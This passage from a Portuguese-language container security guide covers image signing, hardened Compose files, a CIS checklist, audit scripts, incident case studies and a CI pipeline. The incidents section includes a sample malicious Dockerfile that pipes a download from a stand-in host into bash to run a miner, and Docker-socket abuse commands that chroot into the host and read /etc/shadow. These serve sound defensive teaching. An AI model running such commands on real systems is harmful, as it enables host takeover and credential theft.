cosign sign --key cosign.key registry.example.com/myapp:v1.0

# Verificar assinatura
cosign verify --key cosign.pub registry.example.com/myapp:v1.0

# Assinar com chave sem segredo (keyless) — usa OIDC
cosign sign registry.example.com/myapp:v1.0

# Verificar assinatura keyless
cosign verify \
  --certificate-identity=user@example.com \
  --certificate-oidc-issuer=https://accounts.google.com \
  registry.example.com/myapp:v1.0

# Anotar imagem
cosign annotate --annotations "security.company.com/policy=production" \
  registry.example.com/myapp:v1.0
```

### 6.3 Content Trust

```bash
# Habilitar Docker Content Trust
export DOCKER_CONTENT_TRUST=1

# Push so funciona com imagem assinada
docker push registry.example.com/myapp:v1.0

# Desabilitar (cuidado!)
unset DOCKER_CONTENT_TRUST
```

### 6.4 Bloqueio de Vulnerabilidades no Registry

```yaml
# policy.json — politica de aprovacao do Harbor
apiVersion: 1.0
kind: SecurityPolicy
metadata:
  name: image-approval
spec:
  rules:
    - name: block-critical-vulns
      action: reject
      conditions:
        - type: vulnerability
          severity: critical
          count: 1

    - name: block-high-vulns
      action: reject
      conditions:
        - type: vulnerability
          severity: high
          count: 10

    - name: require-signature
      action: reject
      conditions:
        - type: signature
          status: unsigned

    - name: block-latest-tag
      action: reject
      conditions:
        - type: tag
          value: latest

    - name: require-base-image
      action: reject
      conditions:
        - type: base-image
          registry:
            - docker.io/library
            - gcr.io/distroless
            - registry.access.redhat.com
```

---

## 7. Docker Compose Seguro

### 7.1 Restricoes de Seguranca

```yaml
version: "3.8"

services:
  app:
    image: registry.example.com/myapp:v1.0
    read_only: true
    tmpfs:
      - /tmp:rw,noexec,nosuid,size=100m
    security_opt:
      - no-new-privileges:true
      - apparmor=docker-production
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    deploy:
      resources:
        limits:
          cpus: "1.0"
          memory: 512M
        reservations:
          cpus: "0.25"
          memory: 128M
    networks:
      - frontend
    healthcheck:
      test: ["CMD", "wget", "--spider", "-q", "http://localhost:8080/health"]
      interval: 30s
      timeout: 5s
      retries: 3
      start_period: 10s
    logging:
      driver: json-file
      options:
        max-size: "10m"
        max-file: "3"
    environment:
      - APP_ENV=production
    restart: unless-stopped
    user: "1000:1000"

  redis:
    image: redis:7-alpine
    read_only: true
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    networks:
      - backend
    deploy:
      resources:
        limits:
          cpus: "0.5"
          memory: 256M
    volumes:
      - redis-data:/data
    command: >
      redis-server
      --maxmemory 200mb
      --maxmemory-policy allkeys-lru
      --requirepass ${REDIS_PASSWORD}
      --rename-command FLUSHALL ""
      --rename-command FLUSHDB ""
      --rename-command DEBUG ""
      --rename-command KEYS ""

  db:
    image: postgres:16-alpine
    read_only: true
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - CHOWN
      - SETGID
      - SETUID
      - FOWNER
      - DAC_READ_SEARCH
    networks:
      - backend
    deploy:
      resources:
        limits:
          cpus: "2.0"
          memory: 1G
    volumes:
      - db-data:/var/lib/postgresql/data
    environment:
      - POSTGRES_DB=myapp
      - POSTGRES_USER=${DB_USER}
      - POSTGRES_PASSWORD=${DB_PASSWORD}
    tmpfs:
      - /tmp
      - /run/postgresql

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true

volumes:
  redis-data:
  db-data:
```

### 7.2 Rede Isolada

```yaml
# Rede interna sem acesso externo
networks:
  internal:
    driver: bridge
    internal: true

  external:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16
```

### 7.3 Secrets no Compose

```yaml
# Usar secrets do Docker Compose
version: "3.8"

services:
  app:
    image: myapp:latest
    secrets:
      - db_password
      - api_key
    environment:
      - DB_PASSWORD_FILE=/run/secrets/db_password
      - API_KEY_FILE=/run/secrets/api_key

secrets:
  db_password:
    file: ./secrets/db_password.txt
  api_key:
    file: ./secrets/api_key.txt
```

---

## 8. Container Hardening Checklist

### 8.1 Checklist por CIS Benchmark

```markdown
# Container Hardening Checklist

## Host Configuration
- [ ] 1.1 Manter o sistema operacional atualizado
- [ ] 1.2 Usar distribuicao de Linux dedicada para containers
- [ ] 1.3 Remover pacotes desnecessarios do host
- [ ] 1.4 Manter o kernel atualizado
- [ ] [ ] 1.5 Desabilitar servicos desnecessarios

## Docker Daemon
- [ ] 2.1 Configurar log para nivel info
- [ ] 2.2 Habilitar TLS para comunicacao do daemon
- [ ] 2.3 Configurar autenticacao do daemon
- [ ] 2.4 Usar systemd como gerenciador de servico
- [ ] 2.5 Configurar rootless Docker
- [ ] 2.6 Configurar user namespace remapping
- [ ] 2.7 Desabilitar intercontainer communication (icc)
- [ ] 2.8 Configurar日志 max-size e max-file

## Docker Daemon Configuration Files
- [ ] 3.1 Verificar ownership de docker.service
- [ ] 3.2 Verificar permissao de docker.service (644)
- [ ] 3.3 Verificar ownership de docker.socket
- [ ] 3.4 Verificar permissao de docker.socket (644)
- [ ] 3.5 Verificar ownership de /etc/docker
- [ ] 3.6 Verificar permissao de /etc/docker (755)
- [ ] 3.7 Verificar ownership de ca-certificate files
- [ ] 3.8 Verificar permissao de ca-certificate files (444)
- [ ] 3.9 Verificar ownership de docker.sock (660)
- [ ] 3.10 Verificar permissao de docker.sock (660)

## Container Images and Build
- [ ] 4.1 Criar usuario dedicado no Dockerfile
- [ ] 4.2 Usar imagens base oficiais e verificadas
- [ ] 4.3 Configurar HEALTHCHECK
- [ ] 4.4 Usar multi-stage builds
- [ ] 4.5 Escanear vulnerabilidades antes do deploy
- [ ] 4.6 Usar imagens distroless ou minimalistas
- [ ] 4.7 Assinar imagens com Cosign

## Container Runtime
- [ ] 5.1 Usar --read-only para filesystem
- [ ] 5.2 Usar --security-opt=no-new-privileges
- [ ] 5.3 Configurar AppArmor
- [ ] 5.4 Configurar Seccomp
- [ ] 5.5 Usar --cap-drop ALL + --cap-add necessarias
- [ ] 5.6 Nao mapear portas do host (usar rede)
- [ ] 5.7 Nao usar --privileged
- [ ] 5.8 Limitar memória e CPU
- [ ] 5.9 Nao montar Docker socket
- [ ] 5.10 Limitar pids --pids-limit
- [ ] 5.11 Usar --user no run
- [ ] 5.12 Configurar DNS e hostname
- [ ] 5.13 Nao usar --net=host
- [ ] 5.14 Nao usar --ipc=host
- [ ] 5.15 Nao usar --pid=host
```

### 8.2 Verificacao Automatizada

{% raw %}
```bash
#!/bin/bash
# container-hardening-check.sh — Verificacao automatizada do checklist

set -euo pipefail

echo "Container Hardening Verification"
echo "================================="
echo ""

check() {
    local desc="$1"
    local result="$2"
    if [ "$result" = "pass" ]; then
        echo "[PASS] $desc"
    else
        echo "[FAIL] $desc"
    fi
}

# Verificar se Docker roda rootless
if docker info 2>/dev/null | grep -q "Security Options.*rootless"; then
    check "Docker rootless mode" "pass"
else
    check "Docker rootless mode" "fail"
fi

# Verificar user namespace remapping
if grep -q "userns-remap" /etc/docker/daemon.json 2>/dev/null; then
    check "User namespace remapping" "pass"
else
    check "User namespace remapping" "fail"
fi

# Verificar ICC desabilitado
if grep -q '"icc": false' /etc/docker/daemon.json 2>/dev/null; then
    check "Intercontainer communication desabilitado" "pass"
else
    check "Intercontainer communication desabilitado" "fail"
fi

# Verificar live restore
if grep -q '"live-restore": true' /etc/docker/daemon.json 2>/dev/null; then
    check "Live restore habilitado" "pass"
else
    check "Live restore habilitado" "fail"
fi

# Verificar no-new-privileges default
if grep -q '"no-new-privileges": true' /etc/docker/daemon.json 2>/dev/null; then
    check "no-new-privileges como default" "pass"
else
    check "no-new-privileges como default" "fail"
fi

# Verificar log max-size
if grep -q '"max-size"' /etc/docker/daemon.json 2>/dev/null; then
    check "Log max-size configurado" "pass"
else
    check "Log max-size configurado" "fail"
fi

# Verificar TLS do daemon
if [ -f /etc/docker/certs.d ]; then
    check "TLS certificates configurados" "pass"
else
    check "TLS certificates configurados" "fail"
fi

# Verificar Content Trust
if [ "${DOCKER_CONTENT_TRUST:-0}" = "1" ]; then
    check "Docker Content Trust habilitado" "pass"
else
    check "Docker Content Trust habilitado" "fail"
fi

# Verificar se nenhuma container usa host network
HOST_NET=$(docker ps -q --filter "network=host" | wc -l)
if [ "$HOST_NET" -eq 0 ]; then
    check "Nenhum container usando host network" "pass"
else
    check "Nenhum container usando host network" "fail"
fi

# Verificar se nenhum container e privilegiado
PRIV=$(docker ps -q --filter "label=com.docker.compose.project" | \
    xargs -I{} docker inspect --format '{{.HostConfig.Privileged}}' {} 2>/dev/null | \
    grep -c "true" || true)
if [ "$PRIV" -eq 0 ]; then
    check "Nenhum container privilegiado" "pass"
else
    check "Nenhum container privilegiado" "fail"
fi

# Verificar acesso ao Docker socket
SOCKETS=$(docker ps -q --filter "volume=/var/run/docker.sock" | wc -l)
if [ "$SOCKETS" -eq 0 ]; then
    check "Nenhum container com acesso ao socket" "pass"
else
    check "Nenhum container com acesso ao socket" "fail"
fi

echo ""
echo "Verificacao completa."
```
{% endraw %}

---

## 9. Casos Publicos de Seguranca

### 9.1 CVE-2019-5736 — Container Escape via runc

Em janeiro de 2019, uma vulnerabilidade critica foi descoberta no runc, o
runtime de containers mais utilizado. O ataque permitia que um container
comprometido substituísse o binário runc no host, ganhando execucao como root.

**Como funcionava:**

O atacante criava um container malicioso e, ao executar `docker exec`, o
binário runc no host era substituído por um payload malicioso. Isso permitia
escape total do container.

**Impacto:**
- Privilégios de root no host
- Comprometimento de todos os containers no host
- Acesso irrestrito ao sistema operacional

**Mitigacoes:**
- Atualizar runc para versao 1.0.0-rc6+
- Usar namespaces de usuario
- Restringir acesso ao Docker daemon
- Monitorar alterações no binário runc

```bash
# Verificar versao do runc
runc --version

# Protecao: usar user namespace remapping
# /etc/docker/daemon.json
{
  "userns-remap": "default"
}
```

### 9.2 Docker Hub — Imagens Maliciosas (Cryptojacking)

Em 2020 e 2021, centenas de imagens maliciosas foram descobertas no Docker
Hub. Essas imagens continham software de mineracao de criptomoedas
(cryptominers) que consumiam recursos do host.

**Casos documentados:**

- Imagens com nomes populares (nginx, redis, postgres) continham miner Monero
- Imagens falsas de "security tools" que mineravam em background
- Total estimado: mais de 150.000 downloads de imagens maliciosas

**Exemplo de payload encontrado:**

```dockerfile
# Imagem maliciosa descoberta no Docker Hub
FROM ubuntu:20.04

RUN apt-get update && apt-get install -y curl

# Baixar minerador de criptomoeda
RUN curl -sL http://malicious.example.com/xmr | bash

# Iniciar minerador em background
CMD ["/bin/bash", "-c", "/tmp/xmr --url=stratum+tcp://pool.example.com:3333 --user=wallet"]
```

**Mitigacoes:**
- Usar apenas imagens oficiais e verificadas
- Verificar assinaturas de imagens
- Monitorar uso de CPU anormal
- Escanear imagens antes de usar
- Configurar scanning automatizado

### 9.3 Container Escape via Vulnerabilidades do Kernel

Diversos CVEs do kernel Linux permitiram escape de containers:

**CVE-2022-0185 (Janeiro 2022):**
- Vulnerabilidade no subsistema de filesystem do kernel
- Permitia escape via heap overflow em `parse_header_option`
- Afetava containers usando namespaces de usuario

**CVE-2022-0492 (Fevereiro 2022):**
- Vulnerabilidade no cgroup v1
- Permitia escape via `release_agent`
- Afetava containers com namespaces nao configurados

**CVE-2022-25636 (Fevereiro 2022):**
- Vulnerabilidade no netfilter/nftables
- Permitia execucao arbitraria de codigo no kernel
- Afetava containers com acesso a configuracoes de rede

**Mitigacoes:**
- Manter kernel atualizado
- Usar containers non-root
- Configurar AppArmor/Seccomp
- Usar seccomp profiles restritivos
- Considerar Kata Containers ou gVisor para workloads criticos

### 9.4 DIND (Docker-in-Docker) Vulnerabilidades

Docker-in-Docker permite executar Docker dentro de um container. Isso cria
riscos significativos:

**Problemas de seguranca:**
- Container interno pode acessar o Docker daemon do host
- Escalacao de privilegios via socket compartilhado
- Containers internos podem escapar facilmente
- Superficie de ataque drasticamente ampliada

**Exemplo de exposicao:**

```yaml
# Configuracao DIND perigosa
version: "3.8"
services:
  dind:
    image: docker:dind
    privileged: true  # EXTREMAMENTE PERIGOSO
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
```

**Mitigacoes:**
- Evitar DIND whenever possivel
- Usar Kaniko ou Buildah para builds sem Docker daemon
- Se DIND for necessario, usar Docker-in-Docker com rootless
- Configurar dind com Docker daemon em modo rootless dentro do container

```dockerfile
# Build segura com Kaniko (sem Docker daemon)
FROM gcr.io/kaniko-project/executor:debug

COPY . /workspace
RUN /kaniko/executor \
    --context=dir:///workspace \
    --dockerfile=Dockerfile \
    --destination=registry.example.com/myapp:latest \
    --cache=true \
    --cache-repo=registry.example.com/cache
```

### 9.5 Incidentes de Exposicao do Docker Socket

Expor o socket do Docker (`/var/run/docker.sock`) em um container concede
privilégios quase equivalentes a root no host.

**Casos documentados:**

**Casos de mineração via socket exposto:**
Em 2018-2020, varios incidentes foram reportados onde containers com acesso ao
socket Docker eram usados para:
- Criar novos containers privilegiados
- Baixar e executar imagens maliciosas
- Acessar dados de outros containers
- Minerar criptomoedas

**Como o ataque funciona:**

```bash
# Com acesso ao socket, um atacante pode:
# 1. Criar container com acesso ao host
docker run -v /:/host --rm -it alpine chroot /host

# 2. Listar todos os containers e seus dados
docker ps -a
docker inspect <container_id>

# 3. Extrair secrets e variaveis de ambiente
docker exec <container> env

# 4. Montar volumes arbitrarios
docker run -v /etc:/host-etc alpine cat /host-etc/shadow
```

**Mitigacoes:**
- NUNCA montar /var/run/docker.sock em containers de producao
- Usar Docker Context para gerenciamento remoto
- Configurar Docker TCP com TLS mutuo
- Usar ferramentas como docker-socket-proxy

```yaml
# Alternativa segura: docker-socket-proxy
version: "3.8"
services:
  docker-proxy:
    image: tecnativa/docker-socket-proxy
    environment:
      CONTAINERS: 1
      NETWORKS: 0
      VOLUMES: 0
      EXEC: 0
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    read_only: true
    security_opt:
      - no-new-privileges:true
```

---

## 10. Exemplo Completo: Container Security Pipeline

### 10.1 Pipeline Build, Scan, Sign, Push, Verify

```yaml
# .github/workflows/container-security-pipeline.yml
name: Container Security Pipeline

on:
  push:
    branches: [main]
    tags: ['v*']
  pull_request:
    branches: [main]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

permissions:
  contents: read
  packages: write
  security-events: write
  id-token: write

jobs:
  # ============================================
  # Etapa 1: Build da imagem
  # ============================================
  build:
    runs-on: ubuntu-latest
    outputs:
      image-digest: ${{ steps.build.outputs.digest }}
      image-ref: ${{ steps.meta.outputs.tags }}

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Login to Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=semver,pattern={{version}}
            type=sha,prefix=,format=short

      - name: Build and push
        id: build
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          build-args: |
            BUILD_DATE=${{ github.event.head_commit.timestamp }}
            VCS_REF=${{ github.sha }}

  # ============================================
  # Etapa 2: Scanning de seguranca
  # ============================================
  scan-trivy:
    needs: build
    runs-on: ubuntu-latest

    steps:
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ needs.build.outputs.image-ref }}
          format: sarif
          output: trivy-results.sarif
          severity: CRITICAL,HIGH
          ignore-unfixed: true

      - name: Upload Trivy results
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: trivy-results.sarif

      - name: Run Trivy (fail on critical)
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ needs.build.outputs.image-ref }}
          format: table
          severity: CRITICAL
          exit-code: 1
          ignore-unfixed: true

  scan-grype:
    needs: build
    runs-on: ubuntu-latest

    steps:
      - name: Run Grype scanner
        uses: anchore/scan-action@v4
        with:
          image: ${{ needs.build.outputs.image-ref }}
          fail-build: true
          severity-cutoff: critical
          output-format: sarif

      - name: Upload Grype results
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: results.sarif

  scan-misconfig:
    needs: build
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Run Trivy config scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: config
          scan-ref: .
          format: sarif
          output: misconfig-results.sarif
          severity: CRITICAL,HIGH

      - name: Upload misconfig results
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: misconfig-results.sarif

  # ============================================
  # Etapa 3: Assinatura da imagem
  # ============================================
  sign:
    needs: [build, scan-trivy, scan-grype]
    runs-on: ubuntu-latest
    if: github.event_name == 'push'

    steps:
      - name: Install Cosign
        uses: sigstore/cosign-installer@v3

      - name: Login to Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Sign image with Cosign
        run: |
          cosign sign --yes \
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.image-digest }}

      - name: Attach SBOM
        run: |
          cosign attach sbom \
            --sbom /tmp/sbom.json \
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.image-digest }}

  # ============================================
  # Etapa 4: Verificacao de assinatura
  # ============================================
  verify:
    needs: sign
    runs-on: ubuntu-latest
    if: github.event_name == 'push'

    steps:
      - name: Install Cosign
        uses: sigstore/cosign-installer@v3

      - name: Login to Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Verify image signature
        run: |
          cosign verify \
            --certificate-identity=$${{ github.actor }}@users.noreply.github.com \
            --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.image-digest }}

      - name: Generate SLSA provenance
        uses: actions/attest-build-provenance@v1
        with:
          subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          subject-digest: ${{ needs.build.outputs.image-digest }}
          push-to-registry: true

  # ============================================
  # Etapa 5: Deploy de staging
  # ============================================
  deploy-staging:
    needs: [build, sign, verify]
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    environment: staging

    steps:
      - name: Deploy to staging
        run: |
          echo "Deploying ${{ needs.build.outputs.image-ref }} to staging..."
          # kubectl set image deployment/myapp \
          #   myapp=${{ needs.build.outputs.image-ref }} \
          #   --namespace=staging
```

### 10.2 Script de Verificacao Pos-Deploy

```bash
#!/bin/bash
# post-deploy-verify.sh — Verificacao de seguranca pos-deploy

set -euo pipefail

NAMESPACE="${1:-production}"
IMAGE="${2:-}"

echo "=== Verificacao Pos-Deploy ==="
echo "Namespace: $NAMESPACE"
echo "Data: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""

# Verificar pods
echo "--- Pods ---"
kubectl get pods -n "$NAMESPACE" -o json | jq -r '.items[] | "\(.metadata.name) \(.status.phase) \(.status.containerStatuses[0].ready)"'

# Verificar se nenhum container roda como root
echo ""
echo "--- Verificacao de Root ---"
ROOT_CONTAINERS=$(kubectl get pods -n "$NAMESPACE" -o json | \
    jq -r '.items[] | select(.status.containerStatuses[0].running == true) | .metadata.name' | \
    while read pod; do
        kubectl exec -n "$NAMESPACE" "$pod" -- whoami 2>/dev/null | grep -q "^root$" && echo "$pod"
    done)

if [ -n "$ROOT_CONTAINERS" ]; then
    echo "ALERTA: Containers rodando como root:"
    echo "$ROOT_CONTAINERS"
else
    echo "OK: Nenhum container rodando como root"
fi

# Verificar imagens
echo ""
echo "--- Imagens ---"
kubectl get pods -n "$NAMESPACE" -o json | \
    jq -r '.items[].spec.containers[].image' | sort -u | while read img; do
    echo "  Imagem: $img"

    # Verificar assinatura
    if cosign verify --certificate-identity-regexp=".*" --certificate-oidc-issuer-regexp=".*" "$img" 2>/dev/null; then
        echo "    Status: ASSINADA"
    else
        echo "    Status: NAO ASSINADA"
    fi
done

# Verificar restricoes de seguranca
echo ""
echo "--- Restricoes de Seguranca ---"
kubectl get pods -n "$NAMESPACE" -o json | \
    jq -r '.items[] | "\(.metadata.name) privileged=\(.spec.containers[0].securityContext.privileged // false) readOnlyRootFilesystem=\(.spec.containers[0].securityContext.readOnlyRootFilesystem // false)"'

# Verificar recursos
echo ""
echo "--- Recursos ---"
kubectl get pods -n "$NAMESPACE" -o json | \
    jq -r '.items[] | "\(.metadata.name) cpu-limit=\(.spec.containers[0].resources.limits.cpu // "none") mem-limit=\(.spec.containers[0].resources.limits.memory // "none")"'

echo ""
echo "Verificacao completa."
```

---

## 11. Referencias

- CIS Docker Benchmark: https://www.cisecurity.org/benchmark/docker
- NIST SP 800-190 (Application Container Security Guide): https://csrc.nist.gov/publications/detail/sp/800-190/final
- Trivy Documentation: https://trivy.dev/latest/
- Grype Documentation: https://github.com/anchore/grype
- Docker Scout: https://docs.docker.com/scout/
- Cosign Documentation: https://docs.sigstore.dev/cosign/overview/
- OWASP Container Security Verification Standard: https://github.com/OWASP/CSVS
- AppArmor Documentation: https://apparmor.net/
- Seccomp Profiles: https://docs.docker.com/engine/security/seccomp/
- CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes
- Docker Bench Security: https://github.com/docker/docker-bench-security
- Kata Containers: https://katacontainers.io/
- gVisor: https://gvisor.dev/
- Kaniko: https://github.com/GoogleContainerTools/kaniko
- Buildah: https://github.com/containers/buildah
- Harbor Registry: https://goharbor.io/
- CVE-2019-5736 (runc escape): https://nvd.nist.gov/vuln/detail/CVE-2019-5736
- CVE-2022-0185 (kernel heap overflow): https://nvd.nist.gov/vuln/detail/CVE-2022-0185
- CVE-2022-0492 (cgroup escape): https://nvd.nist.gov/vuln/detail/CVE-2022-0492
- CVE-2022-25636 (netfilter): https://nvd.nist.gov/vuln/detail/CVE-2022-25636
- Docker Content Trust: https://docs.docker.com/engine/security/trust/
- SLSA Framework: https://slsa.dev/
- OpenSSF Scorecard: https://securityscorecards.dev/

---

## Resumo do Capitulo

A seguranca de containers requer abordagem em varias camadas. Comece com
Dockerfiles seguros usando multi-stage builds, usuarios nao-root e imagens
minimizadas. Implemente scanning automatizado em todo o pipeline. Configure
AppArmor, Seccomp e capabilities para restringir o ambiente de execucao. Use
Docker Bench Security para auditar continuamente. Assine e verifique imagens com
Cosign. Mantenha o Docker daemon e o kernel atualizados — vulnerabilidades como
CVE-2019-5736 mostram que o kernel compartilhado e o ponto critico de containers.
Nunca exponha o Docker socket. Evite DIND em producao. A seguranca de containers
nao e um objetivo unico, mas um processo continuo de verificacao e melhoria.
